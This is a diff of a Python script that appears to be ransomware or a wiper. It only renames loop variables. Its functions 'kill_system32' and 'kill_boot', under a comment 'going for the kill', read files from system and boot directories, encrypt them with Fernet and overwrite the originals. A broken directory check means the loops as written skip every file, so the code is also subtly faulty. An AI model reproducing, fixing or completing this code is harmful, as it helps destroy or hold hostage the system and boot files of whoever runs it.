@@ -33,32 +33,32 @@ def send(msg):
 #finally...going for the kill
 def first_injection():
     def kill_system32():
-        for file in os.listdir(path):
+        for _ in os.listdir(path):
             if os.path.isdir:
                 continue
-            files.append(file)
+            files.append(_)
             
     kill_system32()
-    for file in files:
-        with open(file, "rb") as thefile:
+    for _ in files:
+        with open(_, "rb") as thefile:
             contents = thefile.read()
             contents_encrypted = Fernet(key).encrypt(contents)
-            with open(file, "wb") as thefile:
+            with open(_, "wb") as thefile:
                 thefile.write(contents_encrypted)
                 
 def second_injection():
     def kill_boot():
-        for file in os.listdir(boot_path):
+        for _ in os.listdir(boot_path):
             if os.path.isdir:
                 continue
-            boot_files.append(file)
+            boot_files.append(_)
             
     kill_boot()
-    for file in boot_files:
-        with open(file, "rb") as afile:
+    for _ in boot_files:
+        with open(_, "rb") as afile:
             bcontents = afile.read()
             bcontents_encrypted = Fernet(key).encrypt(bcontents)
-            with open(file, "wb") as afile:
+            with open(_, "wb") as afile:
                 afile.write(bcontents_encrypted)
                 
                 
